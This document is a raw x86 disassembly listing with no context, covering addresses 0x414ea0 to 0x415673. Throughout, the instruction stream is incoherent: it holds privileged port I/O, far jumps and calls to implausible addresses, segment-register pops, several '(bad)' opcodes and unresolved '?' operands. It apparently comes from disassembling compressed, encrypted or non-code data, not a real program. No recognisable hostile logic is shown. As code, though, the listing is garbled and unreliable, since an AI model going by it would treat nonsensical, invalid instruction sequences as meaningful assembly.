  414ea0:	pushf  
  414ea1:	push   esp
  414ea2:	cdq    
  414ea3:	xchg   ebp,eax
  414ea4:	out    dx,eax
  414ea5:	fld    DWORD PTR [ebx+0x3b]
  414ea8:	adc    dl,BYTE PTR [esi]
  414eaa:	mov    eax,ds:0x415b1e3e
  414eaf:	loop   0x414e84
  414eb1:	addr16 in al,dx
  414eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb4:	sbb    al,0x23
  414eb6:	in     al,0xe3
  414eb8:	idiv   DWORD PTR [edi+ecx*4+0x49]
  414ebc:	imul   ebp,DWORD PTR [ebx+0x12],0x2dd8f609
  414ec3:	outs   dx,BYTE PTR ds:[esi]
  414ec4:	ins    BYTE PTR es:[edi],dx
  414ec5:	and    DWORD PTR [ebx],esi
  414ec7:	jmp    0x85a659cb
  414ecc:	int3   
  414ecd:	outs   dx,BYTE PTR ds:[esi]
  414ece:	pop    ss
  414ecf:	sbb    eax,0xc16b1c35
  414ed4:	pop    ebx
  414ed5:	and    BYTE PTR [eax-0x61],dh
  414ed8:	pop    DWORD PTR [esi+esi*2]
  414edb:	rcr    bh,1
  414edd:	aaa    
  414ede:	aad    0x27
  414ee0:	cmc    
  414ee1:	push   0x88cd2019
  414ee6:	jle    0x414f08
  414ee8:	leave  
  414ee9:	mov    ds:0xda72d3a5,eax
  414eee:	jl     0x414f09
  414ef0:	stos   BYTE PTR es:[edi],al
  414ef1:	sub    dh,al
  414ef3:	jge    0x414ed9
  414ef5:	inc    ebx
  414ef6:	jnp    0x414f18
  414ef8:	daa    
  414ef9:	pop    ss
  414efa:	bound  ecx,QWORD PTR [esi+0x57]
  414efd:	xor    al,0x9e
  414eff:	fs nop
  414f01:	pop    ds
  414f02:	popf   
  414f03:	pop    esp
  414f04:	mov    eax,0x90498fbc
  414f09:	cmp    DWORD PTR [eax+ebp*8],edx
  414f0c:	mov    WORD PTR [edi],?
  414f0e:	nop
  414f0f:	or     al,0xbb
  414f11:	data16 sbb bh,0x6a
  414f15:	jmp    0xc5680654
  414f1a:	push   eax
  414f1b:	out    dx,al
  414f1c:	call   0x4af8:0x8752cf48
  414f23:	popf   
  414f24:	retf   
  414f25:	jecxz  0x414f61
  414f27:	ds dec edi
  414f29:	das    
  414f2a:	aam    0x55
  414f2c:	add    dl,ch
  414f2e:	inc    ebp
  414f2f:	pop    esp
  414f30:	sbb    ecx,DWORD PTR [ecx]
  414f32:	mov    ebp,eax
  414f34:	jbe    0x414f1c
  414f36:	ret    
  414f37:	cmc    
  414f38:	mov    eax,0x1e3d6d68
  414f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f3e:	dec    edi
  414f3f:	dec    ebx
  414f40:	xor    bh,BYTE PTR [ebp+ebx*8+0x7ee94fb4]
  414f47:	pop    esp
  414f48:	icebp  
  414f49:	xor    BYTE PTR [edx-0x57],bl
  414f4c:	cwde   
  414f4d:	adc    eax,0x6d911361
  414f52:	push   ebp
  414f53:	stc    
  414f54:	rcr    BYTE PTR [esp+eax*2-0x29cecf43],0x3f
  414f5c:	out    dx,al
  414f5d:	out    0xf0,al
  414f5f:	xor    bl,ah
  414f61:	cmp    eax,0x91e2e0ac
  414f66:	and    ebp,esp
  414f68:	sbb    BYTE PTR [edx+0x28],dl
  414f6b:	mov    dl,0x38
  414f6d:	cmp    eax,0x27d430f9
  414f72:	cld    
  414f73:	fnstsw WORD PTR [esi+0xd]
  414f76:	xchg   dl,al
  414f78:	cmp    eax,0xd008ac0
  414f7d:	or     bh,bl
  414f7f:	mov    bh,0x7d
  414f81:	into   
  414f82:	mov    esi,0x3977b6dc
  414f87:	ret    
  414f88:	jns    0x414fb2
  414f8a:	jae    0x414fb3
  414f8c:	int    0x52
  414f8e:	and    DWORD PTR [edx-0x1],esp
  414f91:	xchg   esi,eax
  414f92:	test   eax,0xae36a368
  414f97:	les    ebx,FWORD PTR [edi+0x3a]
  414f9a:	ret    
  414f9b:	frstor [edx+0x5bfd87d8]
  414fa1:	inc    eax
  414fa2:	enter  0xe79d,0x10
  414fa6:	test   DWORD PTR [eax-0x18da5792],0xb30d38a9
  414fb0:	sub    ch,BYTE PTR [ebx-0x47]
  414fb3:	mov    dl,0x65
  414fb5:	(bad)  
  414fb6:	and    BYTE PTR [ebx+0x268f6a57],dl
  414fbc:	mov    eax,ds:0x2df9097d
  414fc1:	inc    esi
  414fc2:	jnp    0x414fd3
  414fc4:	and    ch,BYTE PTR ds:0x496ba9ae
  414fca:	out    dx,al
  414fcb:	sbb    esi,DWORD PTR ds:0xfd0c96cf
  414fd1:	or     BYTE PTR [ebx],dh
  414fd3:	jb     0x414f83
  414fd5:	jp     0x414f77
  414fd7:	ret    
  414fd8:	and    eax,0xa14c482e
  414fdd:	fnstcw WORD PTR [edx]
  414fdf:	mov    dh,0xd4
  414fe1:	dec    edx
  414fe2:	fs dec ebp
  414fe4:	push   edx
  414fe5:	xchg   DWORD PTR [ebx],ebp
  414fe7:	cmp    eax,0xc489d62b
  414fec:	sub    eax,ebp
  414fee:	imul   ebx,DWORD PTR [ebp+0x338c36bd],0x5c3020f5
  414ff8:	xor    cl,0x5
  414ffb:	aad    0x35
  414ffd:	mov    dl,dh
  414fff:	mov    ds:0x4b957060,al
  415004:	inc    edx
  415005:	xor    al,0x23
  415007:	(bad)  
  415008:	xchg   esi,eax
  415009:	test   BYTE PTR [ebx-0x75],cl
  41500c:	pop    eax
  41500d:	or     eax,DWORD PTR [edx]
  41500f:	sbb    al,0x38
  415011:	aaa    
  415012:	inc    ebp
  415013:	mov    ebx,0xb4eda3c0
  415018:	add    eax,0x1b759025
  41501d:	pop    ecx
  41501e:	ficomp WORD PTR [ebp-0x27]
  415021:	arpl   si,di
  415023:	pushf  
  415024:	cmp    DWORD PTR [edi-0x4b],0xffffffd3
  415028:	sahf   
  415029:	pop    ecx
  41502a:	and    eax,eax
  41502c:	cmp    bl,BYTE PTR [eax+0x5d8fc220]
  415032:	loope  0x415012
  415034:	jmp    0xc0d21f63
  415039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41503a:	(bad)  
  41503b:	push   esi
  41503c:	inc    eax
  41503d:	sar    DWORD PTR [edx],cl
  41503f:	int    0x14
  415041:	pusha  
  415042:	test   eax,0x43595ef4
  415047:	pusha  
  415048:	scas   al,BYTE PTR es:[edi]
  415049:	psubsw mm6,QWORD PTR [ebp+0x37]
  41504d:	push   esi
  41504e:	test   edi,eax
  415050:	sbb    al,0xbd
  415052:	sub    cl,BYTE PTR [edx]
  415054:	mov    DWORD PTR [edi+0x114f0be5],eax
  41505a:	mov    ebx,0xd0c5b333
  41505f:	jb     0x4150a1
  415061:	out    dx,al
  415062:	bnd jp 0x41507e
  415065:	jmp    0x5a29:0xe9433e84
  41506c:	xlat   BYTE PTR ds:[ebx]
  41506d:	jecxz  0x41500a
  41506f:	imul   BYTE PTR [ebx+0x4e46d456]
  415075:	and    BYTE PTR [ebp+0xcaf1fcd],0xf6
  41507c:	aas    
  41507d:	into   
  41507e:	mov    ch,0x2
  415080:	aad    0x21
  415082:	jge    0x4150c4
  415084:	jmp    0x85c16668
  415089:	icebp  
  41508a:	mov    esp,0x2b4373fd
  41508f:	ss nop
  415091:	jns    0x415111
  415093:	lods   al,BYTE PTR ds:[esi]
  415094:	sbb    bh,BYTE PTR [eax+ebx*8+0x12]
  415098:	or     edi,edi
  41509a:	lea    edx,fs:[edi]
  41509d:	nop
  41509e:	push   0x29afba92
  4150a3:	pop    ecx
  4150a4:	cmp    BYTE PTR [edx+0x14],ch
  4150a7:	rcr    al,cl
  4150a9:	lock xlat BYTE PTR ds:[ebx]
  4150ab:	inc    esi
  4150ac:	pop    eax
  4150ad:	sub    al,0xd2
  4150af:	and    al,0x15
  4150b1:	xchg   BYTE PTR [edx+0x5dcda968],bl
  4150b7:	into   
  4150b8:	xchg   ebp,eax
  4150b9:	jne    0x4150e6
  4150bb:	test   cl,bh
  4150bd:	stos   DWORD PTR es:[edi],eax
  4150be:	xor    al,0x9a
  4150c0:	lods   eax,DWORD PTR ds:[esi]
  4150c1:	test   BYTE PTR [esi],dl
  4150c3:	jno    0x415140
  4150c5:	call   0xa0815769
  4150ca:	jne    0x4150f2
  4150cc:	adc    esp,DWORD PTR [edi+0x25386fde]
  4150d2:	pop    edi
  4150d3:	and    esi,eax
  4150d5:	adc    eax,0x6f81e469
  4150da:	and    esi,eax
  4150dc:	ja     0x415149
  4150de:	dec    edi
  4150df:	inc    edi
  4150e0:	dec    eax
  4150e1:	inc    ebp
  4150e2:	fisub  DWORD PTR [eax-0x19b6737b]
  4150e8:	scas   eax,DWORD PTR es:[edi]
  4150e9:	shr    BYTE PTR [esi],cl
  4150eb:	cmp    cl,BYTE PTR [esi+ecx*1+0x49]
  4150ef:	sub    ah,BYTE PTR [edi+0x356c0b71]
  4150f5:	jmp    0xc29b:0xe643636e
  4150fc:	pop    ds
  4150fd:	and    BYTE PTR [esi-0x20137f98],al
  415103:	jge    0x415167
  415105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415106:	add    al,0xa2
  415108:	jle    0x4150be
  41510a:	sbb    al,0xbb
  41510c:	popa   
  41510d:	loope  0x4150d2
  41510f:	cmp    BYTE PTR [esi+0x452bd5da],0x5a
  415116:	ret    0xe2b5
  415119:	imul   ebx,DWORD PTR [ecx],0x59
  41511c:	(bad)  
  41511e:	lods   al,BYTE PTR ds:[esi]
  41511f:	xlat   BYTE PTR ds:[ebx]
  415120:	arpl   WORD PTR [ebp+edx*4-0x77],cx
  415124:	jle    0x415165
  415126:	shl    DWORD PTR [esi],cl
  415128:	push   esi
  415129:	or     eax,0xd86da401
  41512e:	imul   esi,eax,0xf227b187
  415134:	shl    DWORD PTR [eax+0x37],0x84
  415138:	nop
  415139:	jle    0x4150fd
  41513b:	mov    DWORD PTR [ebx],ebx
  41513d:	stos   DWORD PTR es:[edi],eax
  41513e:	xor    esp,ebx
  415140:	dec    ecx
  415141:	pop    edx
  415142:	in     eax,dx
  415143:	pushf  
  415144:	push   edi
  415145:	cdq    
  415146:	in     al,dx
  415147:	outs   dx,BYTE PTR ds:[esi]
  415148:	inc    ebx
  415149:	sar    DWORD PTR [eax-0x690c1a8f],1
  41514f:	jp     0x4151bd
  415151:	popf   
  415152:	or     al,0x80
  415154:	loopne 0x415145
  415156:	xchg   ecx,eax
  415157:	inc    ecx
  415158:	add    ecx,DWORD PTR [eax]
  41515a:	adc    al,0x4c
  41515c:	call   0xfccda5b7
  415161:	jne    0x415147
  415163:	iret   
  415164:	ds popa 
  415166:	repz jns 0x4151b5
  415169:	repz add al,0x5f
  41516c:	test   BYTE PTR [ebx+0x5143b159],bh
  415172:	sbb    eax,0x55f8272d
  415177:	sbb    DWORD PTR [ebx],esi
  415179:	xchg   edi,ebx
  41517b:	add    ebx,eax
  41517d:	int    0x62
  41517f:	inc    esi
  415180:	mov    ?,WORD PTR [eax+edi*8+0x35ce85ad]
  415187:	data16 or ah,0x4c
  41518b:	or     esi,edi
  41518d:	pop    ebp
  41518e:	or     eax,0xd6bf5aa0
  415193:	xchg   edi,eax
  415194:	icebp  
  415195:	shr    ch,1
  415197:	loope  0x415207
  415199:	xchg   ecx,eax
  41519a:	jbe    0x41520c
  41519c:	xor    al,0xc3
  41519e:	hlt    
  41519f:	adc    dh,BYTE PTR [eax+0xe]
  4151a2:	inc    edi
  4151a3:	dec    edi
  4151a4:	sub    al,0x51
  4151a6:	pop    esi
  4151a7:	xchg   ebx,eax
  4151a8:	push   ss
  4151a9:	(bad)  
  4151aa:	out    0x93,eax
  4151ac:	sbb    DWORD PTR [edx],eax
  4151ae:	pop    edx
  4151af:	sbb    ch,BYTE PTR [edi+0x59715a98]
  4151b5:	cli    
  4151b6:	fldz   
  4151b8:	cwde   
  4151b9:	mov    ds:0x4c43fb19,al
  4151be:	sahf   
  4151bf:	and    DWORD PTR [ebp+0x69f8b74a],edx
  4151c5:	bound  ebx,QWORD PTR [eax+0x26]
  4151c8:	bound  ecx,QWORD PTR [edi-0x484a47db]
  4151ce:	int    0x2b
  4151d0:	shl    BYTE PTR [ecx],cl
  4151d2:	xchg   edi,eax
  4151d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151d4:	stos   BYTE PTR es:[edi],al
  4151d5:	adc    ah,BYTE PTR [edx+0x669926db]
  4151db:	(bad)  
  4151dc:	mov    ecx,0x95e551cb
  4151e1:	mov    BYTE PTR [ecx+0x21],ah
  4151e4:	pop    ss
  4151e5:	inc    esp
  4151e6:	xor    eax,0x6a81f6a6
  4151eb:	test   al,0xb3
  4151ed:	jmp    DWORD PTR [ebx]
  4151ef:	pop    ebx
  4151f0:	shl    BYTE PTR [edx+0x45],cl
  4151f3:	push   0x5d97f6f
  4151f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f9:	sbb    al,0x53
  4151fb:	ins    BYTE PTR es:[edi],dx
  4151fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151fd:	adc    DWORD PTR [ebp-0x1ec3c3ad],edx
  415203:	lods   eax,DWORD PTR ds:[esi]
  415204:	popf   
  415205:	push   es
  415206:	add    al,0xf
  415208:	xor    eax,DWORD PTR [edi-0x67]
  41520b:	pop    esp
  41520c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41520d:	or     BYTE PTR [eax-0xc26b2ba],dh
  415213:	push   es
  415214:	(bad)  
  415215:	ins    BYTE PTR es:[edi],dx
  415216:	loopne 0x41519c
  415218:	ds aaa 
  41521a:	fwait
  41521b:	shr    dl,1
  41521d:	repnz retf 
  41521f:	pop    ss
  415220:	or     eax,0x101f9b45
  415225:	shr    BYTE PTR ds:0x12ff534a,0x2f
  41522c:	ret    0x463d
  41522f:	test   eax,0x702ba550
  415234:	sahf   
  415235:	outs   dx,BYTE PTR ds:[esi]
  415236:	mov    cl,0x30
  415238:	lods   eax,DWORD PTR ds:[esi]
  415239:	call   0x5a28:0x9da4c316
  415240:	add    BYTE PTR [edi],dh
  415242:	xchg   ebx,eax
  415243:	mov    ecx,0xf3f20e01
  415248:	cmp    esi,ebx
  41524a:	pop    ebp
  41524b:	pop    esp
  41524c:	push   ecx
  41524d:	adc    al,0x4a
  41524f:	sahf   
  415250:	lahf   
  415251:	jns    0x415226
  415253:	faddp  st(3),st
  415255:	cdq    
  415256:	jnp    0x415200
  415258:	jl     0x4152d2
  41525a:	jnp    0x4152ac
  41525c:	jmp    0x6092cd06
  415261:	inc    ebx
  415262:	or     ebx,DWORD PTR [ecx+0xb49cee5]
  415268:	mov    WORD PTR [eax-0x5c88d135],ss
  41526e:	xor    BYTE PTR [edi+edi*8+0x61],dh
  415272:	sbb    ch,BYTE PTR [edi-0x6b]
  415275:	and    BYTE PTR [edi+0x5535543d],bh
  41527b:	push   eax
  41527c:	cmp    BYTE PTR [edx-0x4dae348a],bh
  415282:	jle    0x415291
  415284:	xlat   BYTE PTR ds:[ebx]
  415285:	pop    eax
  415286:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415289:	cmp    BYTE PTR [edi-0x50],cl
  41528c:	xor    ebx,ebp
  41528e:	fld    TBYTE PTR [eax+0x633496de]
  415294:	sub    eax,0x754faa85
  415299:	cs cmp al,0xec
  41529c:	out    0x6e,al
  41529e:	nop
  41529f:	jne    0x41525e
  4152a1:	add    ecx,esi
  4152a3:	pop    esp
  4152a4:	cli    
  4152a5:	jnp    0x415241
  4152a7:	int3   
  4152a8:	(bad)  
  4152aa:	lds    ebp,FWORD PTR [ebx-0x1b]
  4152ad:	sbb    edi,DWORD PTR [ecx-0x17556c65]
  4152b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152b4:	(bad)  [ecx-0x7103eabb]
  4152ba:	je     0x4152d6
  4152bc:	mov    BYTE PTR [edi+edi*8],bl
  4152bf:	pop    edx
  4152c0:	jns    0x415294
  4152c2:	push   es
  4152c3:	and    DWORD PTR [ecx-0x30],edi
  4152c6:	add    ebp,ebx
  4152c8:	cwde   
  4152c9:	pushf  
  4152ca:	data16 idiv BYTE PTR [ebx+0x5c10d12a]
  4152d1:	jnp    0x41531c
  4152d3:	mov    dh,0x7c
  4152d5:	imul   eax,DWORD PTR [ecx+edx*1+0x3304aded],0x60
  4152dd:	enter  0xdaaa,0xcd
  4152e1:	and    edx,edi
  4152e3:	add    BYTE PTR [edx-0x40413851],cl
  4152e9:	fs enter 0x7386,0x1d
  4152ee:	leave  
  4152ef:	adc    esi,DWORD PTR [eax-0x79]
  4152f2:	push   edi
  4152f3:	adc    DWORD PTR [edx],eax
  4152f5:	in     al,dx
  4152f6:	loopne 0x41535f
  4152f8:	inc    ecx
  4152f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152fa:	xchg   ecx,eax
  4152fb:	test   al,0xe2
  4152fd:	adc    al,0x1f
  4152ff:	lock or BYTE PTR [esi-0x4d9b08a9],cl
  415306:	(bad)  
  415307:	or     ah,BYTE PTR [esi-0x5fe5499]
  41530d:	jmp    0xf78d:0xf40b515f
  415314:	je     0x41532b
  415316:	cld    
  415317:	adc    ah,BYTE PTR [edi+0x5c90557c]
  41531d:	imul   BYTE PTR [eax-0x4c]
  415320:	xchg   esp,eax
  415321:	push   edx
  415322:	dec    esp
  415323:	push   ebp
  415324:	add    dl,BYTE PTR [esi]
  415326:	cmp    eax,0xd0de519b
  41532b:	mov    edi,0x7286ee50
  415330:	ins    BYTE PTR es:[edi],dx
  415331:	stos   BYTE PTR es:[edi],al
  415332:	mov    cl,0x4c
  415334:	lock jecxz 0x41530d
  415337:	pop    eax
  415338:	lods   eax,DWORD PTR ds:[esi]
  415339:	push   ecx
  41533a:	inc    eax
  41533b:	fstp   TBYTE PTR [esi-0x39]
  41533e:	and    ebx,DWORD PTR [esp]
  415341:	dec    esp
  415342:	sbb    edi,DWORD PTR [edx+0x473a91d7]
  415348:	js     0x4152dd
  41534a:	push   ebx
  41534b:	repnz test al,0x1d
  41534e:	mov    ecx,DWORD PTR [esp+ecx*8+0x3d534893]
  415355:	inc    ebx
  415356:	and    bh,BYTE PTR [esi+0x3b774f69]
  41535c:	push   edx
  41535d:	jp     0x41537e
  41535f:	pop    ebp
  415360:	pop    ebx
  415361:	ficom  DWORD PTR fs:[ecx+edx*1+0x6e]
  415366:	mov    DWORD PTR fs:[ebp+0x6dd7fb43],0x63bed225
  415371:	inc    ecx
  415372:	push   es
  415373:	test   DWORD PTR [esi-0x4d],ebx
  415376:	neg    dh
  415378:	inc    esp
  415379:	jo     0x4152fc
  41537b:	cmp    DWORD PTR [ebp-0x18cbbee8],esp
  415381:	xchg   ecx,eax
  415382:	mov    bh,0x8b
  415384:	add    cl,bl
  415386:	dec    ecx
  415387:	and    al,0x8e
  415389:	dec    edi
  41538a:	or     al,0x83
  41538c:	dec    eax
  41538d:	nop
  41538e:	test   al,0x58
  415390:	jbe    0x4153d6
  415392:	pop    esi
  415393:	call   0xde48b36
  415398:	lds    ebp,FWORD PTR [ecx+0x5e]
  41539b:	sbb    BYTE PTR ds:0xde9f256c,dh
  4153a1:	add    BYTE PTR [esi],cl
  4153a3:	shr    DWORD PTR [edx],0xb5
  4153a6:	jp     0x4153df
  4153a8:	add    ecx,esp
  4153aa:	xor    eax,0x23290aa9
  4153af:	das    
  4153b0:	dec    ebx
  4153b1:	cli    
  4153b2:	in     eax,dx
  4153b3:	out    dx,eax
  4153b4:	ret    0x741a
  4153b7:	(bad)  
  4153b8:	shr    BYTE PTR [ebp-0x2b5ab49a],cl
  4153be:	push   cs
  4153bf:	int3   
  4153c0:	jno    0x415379
  4153c2:	out    0xed,al
  4153c4:	mov    cl,0x7d
  4153c6:	nop
  4153c7:	adc    ch,0x49
  4153ca:	retf   0x8ee0
  4153cd:	(bad)  
  4153ce:	sar    dl,cl
  4153d0:	dec    esp
  4153d1:	sbb    ebx,DWORD PTR [esi]
  4153d3:	cli    
  4153d4:	stos   DWORD PTR es:[edi],eax
  4153d5:	mov    eax,ds:0xcc0bb074
  4153da:	jge    0x4153fc
  4153dc:	pop    ebp
  4153dd:	sub    BYTE PTR [ebx+0x61],dl
  4153e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153e1:	(bad)  
  4153e2:	fbstp  TBYTE PTR [edx+0x3]
  4153e5:	arpl   WORD PTR ss:[edi+0x62d07f6c],cx
  4153ec:	xchg   esp,eax
  4153ed:	inc    esi
  4153ee:	cmp    al,0x3b
  4153f0:	pop    ds
  4153f1:	iret   
  4153f2:	inc    ebx
  4153f3:	je     0x41541e
  4153f5:	dec    ebx
  4153f6:	jae    0x415389
  4153f8:	push   0x4e
  4153fa:	jo     0x41542c
  4153fc:	test   DWORD PTR [edx+0x27],esi
  4153ff:	jg     0x41547f
  415401:	rcr    DWORD PTR [ebp+0x2b],cl
  415404:	add    DWORD PTR [edx-0x13],ebx
  415407:	ret    
  415408:	push   ss
  415409:	(bad)  
  41540a:	pop    esp
  41540b:	push   eax
  41540c:	popa   
  41540d:	out    dx,al
  41540e:	and    BYTE PTR [esi-0x1ede5958],cl
  415414:	sbb    ecx,eax
  415416:	jp     0x415427
  415418:	test   DWORD PTR [edi-0x3a],edi
  41541b:	and    edi,DWORD PTR [edx-0x3d]
  41541e:	nop
  41541f:	xor    DWORD PTR [ebx],ecx
  415421:	addr16 push eax
  415423:	sub    eax,0x731eb0fb
  415428:	jb     0x41544a
  41542a:	xor    DWORD PTR [ecx+0x736f1635],edx
  415430:	jp     0x415459
  415432:	das    
  415433:	stc    
  415434:	inc    edi
  415435:	cdq    
  415436:	bt     DWORD PTR [edi+0x22],0xbf
  41543b:	pop    DWORD PTR [ebx]
  41543d:	aaa    
  41543e:	into   
  41543f:	add    DWORD PTR [edi],ecx
  415441:	mov    al,0x12
  415443:	int    0xe7
  415445:	sub    DWORD PTR [ebx+0x2da85a48],ebx
  41544b:	jbe    0x415494
  41544d:	outs   dx,BYTE PTR ds:[esi]
  41544e:	je     0x41545b
  415450:	mov    dh,0x8e
  415452:	fwait
  415453:	mov    al,ds:0x9816e7f8
  415458:	addr16 cli 
  41545a:	loopne 0x415458
  41545c:	mov    fs,WORD PTR [ecx-0xf77db5f]
  415462:	inc    edi
  415463:	xchg   edx,eax
  415464:	inc    edi
  415465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415466:	sahf   
  415467:	cmp    ecx,DWORD PTR [ecx+edi*2-0x38]
  41546b:	pop    eax
  41546c:	jno    0x4153ee
  41546e:	test   eax,0x82bb9d61
  415473:	mov    eax,0xdd05ecad
  415478:	mov    eax,0xd0ed56e3
  41547d:	(bad)  
  41547e:	cld    
  41547f:	test   BYTE PTR [ecx],ah
  415481:	dec    edx
  415482:	ret    0xb517
  415485:	shl    BYTE PTR [ebx-0x5d],0xa7
  415489:	adc    al,0xe9
  41548b:	xchg   ebp,eax
  41548c:	and    eax,edx
  41548e:	jp     0x41550e
  415490:	fisttp QWORD PTR [esi+0x6c]
  415493:	jo     0x4154ec
  415495:	mov    cl,0xb7
  415497:	(bad)  
  415498:	js     0x41544f
  41549a:	pop    ebx
  41549b:	mov    ecx,0xa837f193
  4154a0:	jp     0x41549d
  4154a2:	popf   
  4154a3:	es aas 
  4154a5:	stc    
  4154a6:	icebp  
  4154a7:	add    ah,BYTE PTR [edx+eiz*4]
  4154aa:	aad    0x90
  4154ac:	sbb    cl,BYTE PTR [edx+0x21d77ddd]
  4154b2:	shl    BYTE PTR [ebx+0x4998dc89],0xd3
  4154b9:	cmp    BYTE PTR [esi-0x1a],bh
  4154bc:	in     eax,0xb1
  4154be:	imul   edi,DWORD PTR [ebx+0x1],0x31
  4154c2:	cs out 0xab,al
  4154c5:	bound  eax,QWORD PTR [ecx-0x3c9d6e71]
  4154cb:	push   ebp
  4154cc:	aaa    
  4154cd:	pop    esi
  4154ce:	jecxz  0x415513
  4154d0:	or     al,0x40
  4154d2:	lock pop ecx
  4154d4:	imul   esp,DWORD PTR [ebx+0x624a5977],0xd0417c8
  4154de:	cmp    eax,0x79190ac2
  4154e3:	add    al,BYTE PTR [ebx]
  4154e5:	bound  edi,QWORD PTR [edi-0xb97cbfb]
  4154eb:	mov    dl,0xd1
  4154ed:	fcom   DWORD PTR [edx-0x3de842f1]
  4154f3:	dec    edx
  4154f4:	push   esp
  4154f5:	push   gs
  4154f7:	in     eax,dx
  4154f8:	nop
  4154f9:	jne    0x41548d
  4154fb:	int    0xd8
  4154fd:	and    ebx,esp
  4154ff:	fld    QWORD PTR [ebp+ebp*1+0xe]
  415503:	sbb    edi,esi
  415505:	add    eax,0x13f243f2
  41550a:	jge    0x415507
  41550c:	add    esp,DWORD PTR [edi]
  41550e:	aad    0xd9
  415510:	sub    eax,0xec13254e
  415515:	xchg   edx,eax
  415516:	ret    
  415517:	adc    BYTE PTR [edi],dl
  415519:	mov    eax,0x23b6cee7
  41551e:	mov    edx,0xf7f68975
  415523:	(bad)  ds:0x411bc761
  415529:	mov    dh,0x92
  41552b:	cmp    eax,0x721b325c
  415530:	mov    BYTE PTR [ecx],al
  415532:	repz retf 0x62f7
  415536:	and    DWORD PTR [ebx+ebx*2-0x356de0ee],ebp
  41553d:	xchg   esi,eax
  41553e:	pop    ebx
  41553f:	mov    WORD PTR [edx+ebx*1+0x1c],?
  415543:	sbb    al,0xac
  415545:	ss push esi
  415547:	pop    ss
  415548:	ss cwde 
  41554a:	jle    0x415562
  41554c:	xchg   edx,eax
  41554d:	pushf  
  41554e:	fimul  WORD PTR [edi+ebx*1]
  415551:	mov    ecx,0xb9c9107b
  415556:	js     0x4155c0
  415558:	jns    0x41557a
  41555a:	add    al,0x27
  41555c:	mov    esi,0xd6bf0f57
  415561:	xchg   edi,eax
  415562:	mov    ds:0x9ece30c1,al
  415567:	leave  
  415568:	add    ecx,DWORD PTR [ebx]
  41556a:	and    eax,DWORD PTR [edi]
  41556c:	sub    dl,BYTE PTR [eax+0x14a815ee]
  415572:	adc    al,0xdb
  415574:	mov    ss,WORD PTR [esp+ebx*4]
  415577:	or     bh,BYTE PTR [esi+0x32]
  41557a:	(bad)  
  41557b:	mov    DWORD PTR [bx],0x741da10
  415582:	mov    cs,esi
  415584:	and    al,0xa5
  415586:	lock xchg ecx,eax
  415588:	add    al,0x5e
  41558a:	adc    BYTE PTR [edx+eiz*1+0x222f6652],dh
  415591:	sub    bh,al
  415593:	mov    ebp,0x23336bb4
  415598:	addr16 ror cl,cl
  41559b:	lds    esi,FWORD PTR [edx+0x8]
  41559e:	cdq    
  41559f:	daa    
  4155a0:	xlat   BYTE PTR ds:[ebx]
  4155a1:	mov    edx,DWORD PTR [esi]
  4155a3:	int3   
  4155a4:	adc    dl,bh
  4155a6:	push   edi
  4155a7:	in     eax,dx
  4155a8:	test   DWORD PTR ds:0xa52867ad,0x896d1fa0
  4155b2:	xor    ecx,0x906d85b9
  4155b8:	adc    al,0xc5
  4155ba:	test   al,0xbe
  4155bc:	or     eax,0x3841effe
  4155c1:	imul   edi,DWORD PTR [ebx],0x2ad870f9
  4155c7:	enter  0xdfc6,0x98
  4155cb:	jmp    0x41558a
  4155cd:	test   DWORD PTR [edi],esp
  4155cf:	mov    ds:0x4d5a0b07,eax
  4155d4:	mov    dl,0x61
  4155d6:	xor    DWORD PTR [ebx+0xe11dd8b],0xa
  4155dd:	mov    bl,0x4a
  4155df:	or     eax,0xbc20c24
  4155e4:	pop    ebp
  4155e5:	push   ss
  4155e6:	inc    ebx
  4155e7:	inc    esp
  4155e8:	shl    DWORD PTR [ebp+0x44],1
  4155eb:	mov    edx,edi
  4155ed:	stos   DWORD PTR es:[edi],eax
  4155ee:	test   esi,ecx
  4155f0:	push   ebp
  4155f1:	(bad)  
  4155f2:	xor    eax,0xb27253ee
  4155f7:	mov    dl,BYTE PTR [edx+eax*8]
  4155fa:	mov    eax,0xdebb7f1c
  4155ff:	(bad)  [ebp+eax*1+0x7bd5aefa]
  415606:	mov    ebx,0x1eaa22c1
  41560b:	push   0x2d
  41560d:	inc    ecx
  41560e:	or     al,0x27
  415610:	jno    0x4155ab
  415612:	ins    BYTE PTR es:[edi],dx
  415613:	xchg   DWORD PTR [ecx-0x6f],ebx
  415616:	je     0x41560c
  415618:	push   edi
  415619:	jmp    0x1bd8:0xbbaa9023
  415620:	aad    0x55
  415622:	sbb    al,al
  415624:	or     DWORD PTR [edi-0x220cdf24],eax
  41562a:	xchg   ecx,eax
  41562b:	call   0x100e:0x889bf406
  415632:	lock adc ch,dh
  415635:	mov    ah,0xff
  415637:	scas   al,BYTE PTR es:[edi]
  415638:	idiv   BYTE PTR [ebx]
  41563a:	bound  ebp,QWORD PTR [ebp+0x2a544625]
  415640:	(bad)  
  415641:	mov    bl,0xd9
  415643:	cmp    ebp,ebx
  415645:	int3   
  415646:	jbe    0x41563c
  415648:	push   edi
  415649:	pop    edx
  41564a:	stos   BYTE PTR es:[edi],al
  41564b:	jbe    0x415612
  41564d:	and    ah,bl
  41564f:	inc    esi
  415650:	aaa    
  415651:	neg    DWORD PTR [ebp-0x5b]
  415654:	adc    edx,DWORD PTR [edi]
  415656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415657:	xchg   esp,eax
  415658:	iret   
  415659:	push   cs
  41565a:	cdq    
  41565b:	and    DWORD PTR [ebx-0x7649a2b4],ebx
  415661:	ror    DWORD PTR ds:0x6e3657aa,cl
  415667:	fcom   st(1)
  415669:	es xchg edx,eax
  41566b:	test   al,ch
  41566d:	dec    esi
  41566e:	mov    esi,0x765df3f7
  415673:	fistp  DWORD PTR [ecx]
